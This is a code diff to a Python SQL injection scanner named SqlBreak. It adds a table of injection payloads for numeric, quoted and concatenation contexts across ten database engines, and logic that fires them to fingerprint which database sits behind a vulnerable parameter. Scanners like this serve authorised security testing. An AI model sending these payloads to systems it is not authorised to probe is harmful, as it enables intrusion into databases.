@@ -330,6 +330,70 @@ class SqlBreak:
 				)
 			]
 
+	FINGERTESTS= { 'Unescaped Injection' :[
+SqlTest("MySQL",LogicNode("and").add(OpNode(' and CONNECTION_ID()=CONNECTION_ID() and 21=21',True),OpNode(' and USER()=USER() and 21=21',True))) ,
+SqlTest("MS Sql Server",LogicNode("and").add(OpNode(' and len(1)=1 and 21=21',True),OpNode(' and len(@@version)=len(@@version) and 21=21',True))) ,
+SqlTest("Oracle",LogicNode("and").add(OpNode(' and ROWNUM=ROWNUM and 21=21',True),OpNode(' and length(SYSDATE)=length(SYSDATE) and 21=21',True))) ,
+SqlTest("DB2",LogicNode("and").add(OpNode(' and value(1,1)=1 and 21=21',True),OpNode(' and length(CURRENT SERVER)=length(CURRENT SERVER) and 21=21',True))) ,
+SqlTest("PostgreSQL",LogicNode("and").add(OpNode(' and length(1)=1 and 21=21',True),OpNode(' and length(SESSION_USER)=length(SESSION_USER) and 21=21',True))) ,
+SqlTest("Informix",LogicNode("and").add(OpNode(' and length(DBSERVERNAME)=length(DBSERVERNAME) and 21=21',True),OpNode(' and length(SITENAME)=length(SITENAME) and 21=21',True))) ,
+SqlTest("Sybase",LogicNode("and").add(OpNode(' and char_length(db_name())=char_length(db_name()) and 21=21',True),OpNode(' and char_length(@@servername)=char_length(@@servername) and 21=21',True))) ,
+SqlTest("MSAccess",LogicNode("and").add(OpNode(' and Time()=Time() and 21=21',True),OpNode(' and IsNumeric(1)=IsNumeric(1) and 21=21',True))) ,
+SqlTest("Pointbase",LogicNode("and").add(OpNode(' and CURRENT_USER=CURRENT_USER and 21=21',True),OpNode(' and CURRENT_SESSION=CURRENT_SESSION and 21=21',True))) ,
+SqlTest("SQLite",LogicNode("and").add(OpNode(' and sqlite_version()=sqlite_version() and 21=21',True),OpNode(' and last_insert_rowid()=last_insert_rowid() and 21=21',True))) 
+],
+'Numeric Injection' :[
+SqlTest("MySQL",LogicNode("and").add(OpNode('-(CONNECTION_ID()-CONNECTION_ID())',True),OpNode('-(USER()-USER())',True))) ,
+SqlTest("MS Sql Server",LogicNode("and").add(OpNode('-(len(1)-1)',True),OpNode('-(len(@@version)-len(@@version))',True))) ,
+SqlTest("Oracle",LogicNode("and").add(OpNode('-(ROWNUM-ROWNUM)',True),OpNode('-(length(SYSDATE)-length(SYSDATE))',True))) ,
+SqlTest("DB2",LogicNode("and").add(OpNode('-(value(1,1)-1)',True),OpNode('-(length(CURRENT SERVER)-length(CURRENT SERVER))',True))) ,
+SqlTest("PostgreSQL",LogicNode("and").add(OpNode('-(length(1)-1)',True),OpNode('-(length(SESSION_USER)-length(SESSION_USER))',True))) ,
+SqlTest("Informix",LogicNode("and").add(OpNode('-(length(DBSERVERNAME)-length(DBSERVERNAME))',True),OpNode('-(length(SITENAME)-length(SITENAME))',True))) ,
+SqlTest("Sybase",LogicNode("and").add(OpNode('-(char_length(db_name())-char_length(db_name()))',True),OpNode('-(char_length(@@servername)-char_length(@@servername))',True))) ,
+SqlTest("MSAccess",LogicNode("and").add(OpNode('-(Time()-Time())',True),OpNode('-(IsNumeric(1)-IsNumeric(1))',True))) ,
+SqlTest("Pointbase",LogicNode("and").add(OpNode('-(CURRENT_USER-CURRENT_USER)',True),OpNode('-(CURRENT_SESSION-CURRENT_SESSION)',True))) ,
+SqlTest("SQLite",LogicNode("and").add(OpNode('-(sqlite_version()-sqlite_version())',True),OpNode('-(last_insert_rowid()-last_insert_rowid())',True))) 
+],
+'Single Quoted Injection' :[
+SqlTest("MySQL",LogicNode("and").add(OpNode("' and CONNECTION_ID()=CONNECTION_ID() and '21'='21",True),OpNode("' and USER()=USER() and '21'='21",True))) ,
+SqlTest("MS Sql Server",LogicNode("and").add(OpNode("' and len(1)=1 and '21'='21",True),OpNode("' and len(@@version)=len(@@version) and '21'='21",True))) ,
+SqlTest("Oracle",LogicNode("and").add(OpNode("' and ROWNUM=ROWNUM and '21'='21",True),OpNode("' and length(SYSDATE)=length(SYSDATE) and '21'='21",True))) ,
+SqlTest("DB2",LogicNode("and").add(OpNode("' and value(1,1)=1 and '21'='21",True),OpNode("' and length(CURRENT SERVER)=length(CURRENT SERVER) and '21'='21",True))) ,
+SqlTest("PostgreSQL",LogicNode("and").add(OpNode("' and length(1)=1 and '21'='21",True),OpNode("' and length(SESSION_USER)=length(SESSION_USER) and '21'='21",True))) ,
+SqlTest("Informix",LogicNode("and").add(OpNode("' and length(DBSERVERNAME)=length(DBSERVERNAME) and '21'='21",True),OpNode("' and length(SITENAME)=length(SITENAME) and '21'='21",True))) ,
+SqlTest("Sybase",LogicNode("and").add(OpNode("' and char_length(db_name())=char_length(db_name()) and '21'='21",True),OpNode("' and char_length(@@servername)=char_length(@@servername) and '21'='21",True))) ,
+SqlTest("MSAccess",LogicNode("and").add(OpNode("' and Time()=Time() and '21'='21",True),OpNode("' and IsNumeric(1)=IsNumeric(1) and '21'='21",True))) ,
+SqlTest("Pointbase",LogicNode("and").add(OpNode("' and CURRENT_USER=CURRENT_USER and '21'='21",True),OpNode("' and CURRENT_SESSION=CURRENT_SESSION and '21'='21",True))) ,
+SqlTest("SQLite",LogicNode("and").add(OpNode("' and sqlite_version()=sqlite_version() and '21'='21",True),OpNode("' and last_insert_rowid()=last_insert_rowid() and '21'='21",True))) 
+],
+'Double Quoted Injection' :[
+SqlTest("MySQL",LogicNode("and").add(OpNode('" and CONNECTION_ID()=CONNECTION_ID() and "21"="21',True),OpNode('" and USER()=USER() and "21"="21',True))) ,
+SqlTest("MS Sql Server",LogicNode("and").add(OpNode('" and len(1)=1 and "21"="21',True),OpNode('" and len(@@version)=len(@@version) and "21"="21',True))) ,
+SqlTest("Oracle",LogicNode("and").add(OpNode('" and ROWNUM=ROWNUM and "21"="21',True),OpNode('" and length(SYSDATE)=length(SYSDATE) and "21"="21',True))) ,
+SqlTest("DB2",LogicNode("and").add(OpNode('" and value(1,1)=1 and "21"="21',True),OpNode('" and length(CURRENT SERVER)=length(CURRENT SERVER) and "21"="21',True))) ,
+SqlTest("PostgreSQL",LogicNode("and").add(OpNode('" and length(1)=1 and "21"="21',True),OpNode('" and length(SESSION_USER)=length(SESSION_USER) and "21"="21',True))) ,
+SqlTest("Informix",LogicNode("and").add(OpNode('" and length(DBSERVERNAME)=length(DBSERVERNAME) and "21"="21',True),OpNode('" and length(SITENAME)=length(SITENAME) and "21"="21',True))) ,
+SqlTest("Sybase",LogicNode("and").add(OpNode('" and char_length(db_name())=char_length(db_name()) and "21"="21',True),OpNode('" and char_length(@@servername)=char_length(@@servername) and "21"="21',True))) ,
+SqlTest("MSAccess",LogicNode("and").add(OpNode('" and Time()=Time() and "21"="21',True),OpNode('" and IsNumeric(1)=IsNumeric(1) and "21"="21',True))) ,
+SqlTest("Pointbase",LogicNode("and").add(OpNode('" and CURRENT_USER=CURRENT_USER and "21"="21',True),OpNode('" and CURRENT_SESSION=CURRENT_SESSION and "21"="21',True))) ,
+SqlTest("SQLite",LogicNode("and").add(OpNode('" and sqlite_version()=sqlite_version() and "21"="21',True),OpNode('" and last_insert_rowid()=last_insert_rowid() and "21"="21',True))) 
+],
+'Pipe concatenation Injection' :[
+SqlTest("Oracle",LogicNode("and").add(OpNode("'||substr(1,1,(ROWNUM-ROWNUM))||'",True),OpNode("'||substr(1,1,(length(SYSDATE)-length(SYSDATE)))||'",True))) ,
+SqlTest("DB2",LogicNode("and").add(OpNode("'||substr('1',1,(value(1,1)-1))||'",True),OpNode("'||substr('1',1,(length(CURRENT SERVER)-length(CURRENT SERVER)))||'",True))) ,
+SqlTest("PostgreSQL",LogicNode("and").add(OpNode("'||substr(1,1,(length(1)-1))||'",True),OpNode("'||substr(1,1,(length(SESSION_USER)-length(SESSION_USER)))||'",True))) ,
+SqlTest("Informix",LogicNode("and").add(OpNode("'||substr(1,1,(length(DBSERVERNAME)-length(DBSERVERNAME)))||'",True),OpNode("'||substr(1,1,(length(SITENAME)-length(SITENAME)))||'",True))) ,
+SqlTest("Pointbase",LogicNode("and").add(OpNode("'||substr(1,1,(CURRENT_USER-CURRENT_USER))||'",True),OpNode("'||substr(1,1,(CURRENT_SESSION-CURRENT_SESSION))||'",True))) ,
+SqlTest("SQLite",LogicNode("and").add(OpNode("'||substr(1,1,(sqlite_version()-sqlite_version()))||'",True),OpNode("'||substr(1,1,(last_insert_rowid()-last_insert_rowid()))||'",True))) 
+],
+'Plus concatenation Injection' :[
+SqlTest("MySQL",LogicNode("and").add(OpNode("'+char(CONNECTION_ID()-CONNECTION_ID())+'",True),OpNode("'+char(USER()-USER())+'",True))) ,
+SqlTest("MS Sql Server",LogicNode("and").add(OpNode("'+substring('1',1,(len(1)-1))+'",True),OpNode("'+substring('1',1,(len(@@version)-len(@@version)))+'",True))) ,
+SqlTest("Sybase",LogicNode("and").add(OpNode("'+char(char_length(db_name())-char_length(db_name()))+'",True),OpNode("'+char(char_length(@@servername)-char_length(@@servername))+'",True))) ,
+SqlTest("MSAccess",LogicNode("and").add(OpNode("'+chr(Time()-Time())+'",True),OpNode("'+chr(IsNumeric(1)-IsNumeric(1))+'",True))) 
+] }
+
+
 	REWORDS=re.compile("([a-zA-Z0-9]{3,})")
 	SCRIPTS=re.compile("(<script[^>]*>([^<]|<[^s]|<s[^c]|<sc[^r]|<scr[^i]|<scri[^p])*</script>)",re.I)
 	TAG=re.compile("<[^>]*>")
@@ -383,9 +447,25 @@ class SqlBreak:
 						break
 				if error:
 					logging.debug ("Error Signature Found: "+error)
+
+
+				finger=None
+				if inj:
+					for t in SqlBreak.FINGERTESTS[inj]:
+						if GET=="GET":
+							res,errortmp=t.execute(self.OrigReq,v,dynO,inUrl=True)
+						else:
+							res,errortmp=t.execute(self.OrigReq,v,dynO,inUrl=False)
+						if not error and errortmp:
+							error=errortmp	
+						if res:
+							finger=t.desc
+							break
+						
+
 	
 				if error or inj:
-					self.results.append([v.name,inj,error])
+					self.results.append([v.name,inj,error,finger])
 
 
 if __name__=='__main__':
@@ -431,7 +511,6 @@ if __name__=='__main__':
 	s=SqlBreak(a)
 
 	varsperline=int(80/(max([len(i.name) for i in a.getVars()])+5))
-	print (varsperline)
 	vars=[]
 	v=a.getUrlVars()
 	printvars(v,varsperline,"Variables in URL",0)
@@ -456,9 +535,10 @@ if __name__=='__main__':
 	if "--xml" in optsd:
 		print (s.getXMLResults().toprettyxml(indent="\t"))
 	else:
-		for name,inj,error in s.results:
+		for name,inj,error,finger in s.results:
 			print ("# -------------------------------------")
 			print ("#              Variable : "+str(name))
 			print ("#        Injection type : "+str(inj))
 			print ("# Signature error found : "+str(error))
+			print ("#  Database Fingerprint : "+str(finger))
 			print ("# -------------------------------------")
